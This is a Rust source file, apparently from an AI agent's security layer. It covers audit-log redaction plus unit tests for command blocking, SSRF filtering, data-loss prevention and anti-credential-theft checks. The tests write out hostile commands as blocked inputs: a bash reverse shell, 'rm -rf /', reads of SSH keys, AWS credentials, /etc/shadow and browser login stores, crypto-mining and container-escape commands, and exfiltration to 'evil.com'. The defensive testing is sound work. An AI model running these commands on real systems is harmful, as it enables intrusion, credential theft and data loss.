                    let mut new_map = serde_json::Map::new();
                    for (key, value) in map {
                        let kl = key.to_lowercase();
                        if kl.contains("token")
                            || kl.contains("secret")
                            || kl.contains("password")
                            || kl.contains("api_key")
                            || kl.contains("credential")
                        {
                            new_map.insert(
                                key.clone(),
                                serde_json::Value::String("[REDACTED]".to_string()),
                            );
                        } else {
                            new_map.insert(key.clone(), self.redact_pii(value));
                        }
                    }
                    serde_json::Value::Object(new_map)
                }
                serde_json::Value::Array(arr) => {
                    serde_json::Value::Array(arr.iter().map(|v| self.redact_pii(v)).collect())
                }
                other => other.clone(),
            }
        }

        fn classify_severity(event_type: &str) -> AuditSeverity {
            match event_type {
                "tool_execution" | "tool_completed" | "user_message" => AuditSeverity::Info,
                "command_blocked" | "permission_denied" | "rate_limited" => {
                    AuditSeverity::Warning
                }
                "policy_violation" | "signature_invalid" | "dlp_finding" => {
                    AuditSeverity::Alert
                }
                "security_breach" | "injection_detected" | "exfiltration_detected" => {
                    AuditSeverity::Critical
                }
                _ => AuditSeverity::Info,
            }
        }
    }

    fn shellexpand(path: &str) -> String {
        if path.starts_with("~/") {
            if let Ok(home) = std::env::var("HOME") {
                return path.replacen("~", &home, 1);
            }
        }
        path.to_string()
    }
}

// ---------------------------------------------------------------------------
// Unit Tests
// ---------------------------------------------------------------------------
#[cfg(test)]
mod tests {
    use super::command_guardian::CommandGuardian;
    use super::dlp::{DlpAction, DlpEngine};
    use super::ssrf::SsrfGuard;
    use super::stealer::AntiStealer;
    use crate::core::config::GuardianConfig;

    // ---- Guardian tests ----

    fn default_guardian() -> CommandGuardian {
        CommandGuardian::new(&GuardianConfig::default()).unwrap()
    }

    #[test]
    fn guardian_blocks_rm_rf_root() {
        let g = default_guardian();
        assert!(g.validate_command("rm -rf /").is_err());
    }

    #[test]
    fn guardian_blocks_sudo() {
        let g = default_guardian();
        assert!(g.validate_command("sudo apt install foo").is_err());
    }

    #[test]
    fn guardian_blocks_reverse_shell() {
        let g = default_guardian();
        assert!(g.validate_command("bash -i >& /dev/tcp/10.0.0.1/4242 0>&1").is_err());
    }

    #[test]
    fn guardian_blocks_subshell() {
        let g = default_guardian();
        assert!(g.validate_command("echo $(whoami)").is_err());
    }

    #[test]
    fn guardian_blocks_null_bytes() {
        let g = default_guardian();
        assert!(g.validate_command("cat file\0.txt").is_err());
    }

    #[test]
    fn guardian_blocks_url_encoded_traversal() {
        let g = default_guardian();
        assert!(g.validate_command("cat %2e%2e/etc/passwd").is_err());
    }

    #[test]
    fn guardian_allows_safe_commands() {
        let g = default_guardian();
        assert!(g.validate_command("ls -la").is_ok());
        assert!(g.validate_command("echo hello").is_ok());
        assert!(g.validate_command("cat README.md").is_ok());
        assert!(g.validate_command("git status").is_ok());
    }

    #[test]
    fn guardian_blocks_pipe_allows_logical_or() {
        let g = default_guardian();
        assert!(g.validate_command("cat file | grep secret").is_err());
        assert!(g.validate_command("test -f file || echo missing").is_ok());
    }

    #[test]
    fn guardian_blocks_credential_access() {
        let g = default_guardian();
        assert!(g.validate_command("cat /etc/shadow").is_err());
        assert!(g.validate_command("cat ~/.ssh/id_rsa").is_err());
    }

    #[test]
    fn guardian_blocks_cryptomining() {
        let g = default_guardian();
        assert!(g.validate_command("xmrig --pool stratum+tcp://pool.com").is_err());
        assert!(g.validate_command("minerd -o pool").is_err());
    }

    #[test]
    fn guardian_blocks_container_escape() {
        let g = default_guardian();
        assert!(g.validate_command("docker run --privileged alpine").is_err());
        assert!(g.validate_command("nsenter --target 1 --all").is_err());
    }

    #[test]
    fn guardian_blocks_history_manipulation() {
        let g = default_guardian();
        assert!(g.validate_command("history -c").is_err());
        assert!(g.validate_command("unset HISTFILE").is_err());
    }

    #[test]
    fn guardian_blocks_stealer_patterns() {
        let g = default_guardian();
        assert!(g.validate_command("cat ~/.aws/credentials").is_err());
        assert!(g.validate_command("cat ~/.kube/config").is_err());
        assert!(g.validate_command("cat ~/.docker/config.json").is_err());
        assert!(g.validate_command("base64 ~/.ssh/id_rsa.pem").is_err());
        assert!(g.validate_command("sqlite3 'Login Data' .dump").is_err());
        assert!(g.validate_command("security find-generic-password").is_err());
    }

    #[test]
    fn guardian_blocks_empty_command() {
        let g = default_guardian();
        assert!(g.validate_command("").is_err());
        assert!(g.validate_command("   ").is_err());
    }

    #[test]
    fn guardian_redact_command() {
        let redacted = CommandGuardian::redact_command(
            "curl -H 'Authorization: Bearer sk-abc123' https://api.example.com",
        );
        assert!(redacted.contains("REDACTED"));
        assert!(!redacted.contains("sk-abc123"));
    }

    #[test]
    fn guardian_has_50_plus_patterns() {
        let g = default_guardian();
        assert!(
            g.blocked_count() >= 50,
            "Expected >=50 patterns, got {}",
            g.blocked_count()
        );
    }

    // ---- SSRF tests ----

    fn test_ssrf() -> SsrfGuard {
        SsrfGuard::new(true, vec![], vec![])
    }

    #[test]
    fn ssrf_blocks_aws_metadata() {
        let g = test_ssrf();
        let r = g.check_url("http://169.254.169.254/latest/meta-data/");
        assert!(!r.allowed);
        assert!(r.reason.unwrap().contains("metadata"));
    }

    #[test]
    fn ssrf_blocks_gcp_metadata() {
        let g = test_ssrf();
        assert!(!g.check_url("http://metadata.google.internal/computeMetadata/v1/").allowed);
    }

    #[test]
    fn ssrf_blocks_azure_metadata() {
        let g = test_ssrf();
        assert!(!g.check_url("http://metadata.azure.com/metadata/instance").allowed);
    }

    #[test]
    fn ssrf_blocks_localhost() {
        let g = test_ssrf();
        let r = g.check_url("http://127.0.0.1/admin");
        assert!(!r.allowed);
        assert!(r.reason.unwrap().contains("Loopback"));
    }

    #[test]
    fn ssrf_blocks_private_ranges() {
        let g = test_ssrf();
        assert!(!g.check_url("http://10.0.0.1/internal").allowed);
        assert!(!g.check_url("http://172.16.0.1/internal").allowed);
        assert!(!g.check_url("http://192.168.1.1/admin").allowed);
    }

    #[test]
    fn ssrf_blocks_file_scheme() {
        let g = test_ssrf();
        let r = g.check_url("file:///etc/passwd");
        assert!(!r.allowed);
    }

    #[test]
    fn ssrf_allows_public_url() {
        let g = test_ssrf();
        assert!(g.check_url("https://api.example.com/v1/data").allowed);
    }

    #[test]
    fn ssrf_blocks_decimal_ip_obfuscation() {
        let g = test_ssrf();
        let r = g.check_url("http://2130706433/admin");
        assert!(!r.allowed);
        assert!(r.reason.unwrap().contains("obfuscation"));
    }

    #[test]
    fn ssrf_blocks_hex_ip_obfuscation() {
        let g = test_ssrf();
        let r = g.check_url("http://0x7f000001/admin");
        assert!(!r.allowed);
    }

    #[test]
    fn ssrf_blocks_cgnat() {
        let g = test_ssrf();
        let r = g.check_url("http://100.64.0.1/internal");
        assert!(!r.allowed);
        assert!(r.reason.unwrap().contains("CGNAT"));
    }

    #[test]
    fn ssrf_blocks_ipv6_loopback() {
        let g = test_ssrf();
        assert!(!g.check_url("http://[::1]/admin").allowed);
    }

    #[test]
    fn ssrf_blocks_ipv4_mapped_ipv6() {
        let g = test_ssrf();
        let ip: std::net::IpAddr = "::ffff:127.0.0.1".parse().unwrap();
        assert!(!g.check_resolved_ip(ip).allowed);
    }

    #[test]
    fn ssrf_userinfo_bypass() {
        let g = test_ssrf();
        let r = g.check_url("http://safe.com@169.254.169.254/latest/meta-data/");
        assert!(!r.allowed);
    }

    // ---- DLP tests ----

    fn test_dlp() -> DlpEngine {
        DlpEngine::new(true, DlpAction::Redact).unwrap()
    }

    #[test]
    fn dlp_blocks_rsa_private_key() {
        let e = test_dlp();
        let content = "-----BEGIN RSA PRIVATE KEY-----\nMIIE...\n-----END RSA PRIVATE KEY-----";
        let r = e.scan_output(content);
        assert!(r.blocked);
    }

    #[test]
    fn dlp_blocks_openssh_key() {
        let e = test_dlp();
        let content =
            "-----BEGIN OPENSSH PRIVATE KEY-----\nb3Bl...\n-----END OPENSSH PRIVATE KEY-----";
        let r = e.scan_output(content);
        assert!(r.blocked);
    }

    #[test]
    fn dlp_redacts_aws_access_key() {
        let e = test_dlp();
        let r = e.scan_output("aws_access_key_id = AKIAIOSFODNN7EXAMPLE");
        assert!(!r.blocked);
        assert!(r.output.contains("[AWS_KEY_REDACTED]"));
        assert!(!r.output.contains("AKIAIOSFODNN7EXAMPLE"));
    }

    #[test]
    fn dlp_blocks_aws_secret_key() {
        let e = test_dlp();
        let r = e.scan_output(
            "aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
        );
        assert!(r.blocked);
    }

    #[test]
    fn dlp_redacts_github_token() {
        let e = test_dlp();
        let r = e.scan_output("GITHUB_TOKEN=ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgh");
        assert!(r.output.contains("[GITHUB_TOKEN_REDACTED]"));
    }

    #[test]
    fn dlp_redacts_database_uri() {
        let e = test_dlp();
        let r = e.scan_output("postgres://admin:super_secret@db.example.com:5432/mydb");
        assert!(r.output.contains("[DATABASE_URI_REDACTED]"));
    }

    #[test]
    fn dlp_redacts_jwt() {
        let e = test_dlp();
        let r = e.scan_output(
            "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U",
        );
        assert!(r.output.contains("[JWT_REDACTED]"));
    }

    #[test]
    fn dlp_blocks_shadow_content() {
        let e = test_dlp();
        let r = e.scan_output("root:$6$xyz$longhashhere:19000:0:99999:7:::");
        assert!(r.blocked);
    }

    #[test]
    fn dlp_allows_normal_output() {
        let e = test_dlp();
        let content = "Build successful. 42 tests passed.";
        let r = e.scan_output(content);
        assert!(!r.blocked);
        assert!(r.findings.is_empty());
        assert_eq!(r.output, content);
    }

    #[test]
    fn dlp_disabled_passes_everything() {
        let e = DlpEngine::new(false, DlpAction::Block).unwrap();
        let r = e.scan_output("AKIAIOSFODNN7EXAMPLE");
        assert!(!r.blocked);
    }

    #[test]
    fn dlp_has_22_plus_rules() {
        let e = test_dlp();
        assert!(
            e.rule_count() >= 22,
            "Expected >=22 DLP rules, got {}",
            e.rule_count()
        );
    }

    // ---- Anti-Stealer tests ----

    fn test_stealer() -> AntiStealer {
        AntiStealer::new(true).unwrap()
    }

    #[test]
    fn stealer_blocks_ssh_key() {
        let s = test_stealer();
        let r = s.check_file_access("/home/user/.ssh/id_rsa", "sess");
        assert!(r.blocked);
        assert!(r.findings.iter().any(|f| f.category == "SshKeys"));
    }

    #[test]
    fn stealer_blocks_aws_credentials() {
        let s = test_stealer();
        let r = s.check_file_access("/home/user/.aws/credentials", "sess");
        assert!(r.blocked);
    }

    #[test]
    fn stealer_blocks_crypto_wallet() {
        let s = test_stealer();
        let r = s.check_file_access("/home/user/.bitcoin/wallet.dat", "sess");
        assert!(r.blocked);
    }

    #[test]
    fn stealer_blocks_browser_profile() {
        let s = test_stealer();
        let r = s.check_file_access(
            "/home/user/.config/google-chrome/Default/Login Data",
            "sess",
        );
        assert!(r.blocked);
    }

    #[test]
    fn stealer_blocks_keychain() {
        let s = test_stealer();
        let r = s.check_file_access(
            "/Users/user/Library/Keychains/login.keychain-db",
            "sess",
        );
        assert!(r.blocked);
    }

    #[test]
    fn stealer_allows_normal_file() {
        let s = test_stealer();
        let r = s.check_file_access("/home/user/project/src/main.rs", "sess");
        assert!(!r.blocked);
        assert!(r.findings.is_empty());
    }

    #[test]
    fn stealer_detects_aws_key_in_content() {
        let s = test_stealer();
        let findings = s.scan_content("aws_access_key_id = AKIAIOSFODNN7EXAMPLE");
        assert!(!findings.is_empty());
    }

    #[test]
    fn stealer_detects_private_key_in_content() {
        let s = test_stealer();
        let findings = s.scan_content("-----BEGIN RSA PRIVATE KEY-----\nMIIE...");
        assert!(!findings.is_empty());
    }

    #[test]
    fn stealer_command_detection() {
        let s = test_stealer();
        assert!(s.check_command("base64 ~/.ssh/id_rsa.pem").blocked);
        assert!(s.check_command("find / -name '*.pem'").blocked);
        assert!(s.check_command("grep -r password /etc/").blocked);
        assert!(!s.check_command("ls -la").blocked);
    }

    #[test]
    fn stealer_exfiltration_correlation() {
        let s = test_stealer();
        let session = "test-session-123";
        s.check_file_access("/home/user/.aws/credentials", session);
        let r = s.check_exfiltration_correlation("evil.com", session);
        assert!(r.blocked);
        assert!(r.findings.iter().any(|f| f.rule == "exfiltration-correlation"));
    }

    #[test]
    fn stealer_no_cross_session_correlation() {
        let s = test_stealer();
        s.check_file_access("/home/user/.aws/credentials", "session-a");
        let r = s.check_exfiltration_correlation("evil.com", "session-b");
        assert!(!r.blocked);
    }

    #[test]
    fn stealer_env_file_detection() {
        let s = test_stealer();
        assert!(s.check_file_access("/app/.env", "s").blocked);
        assert!(s.check_file_access("/app/.env.production", "s").blocked);
    }
}
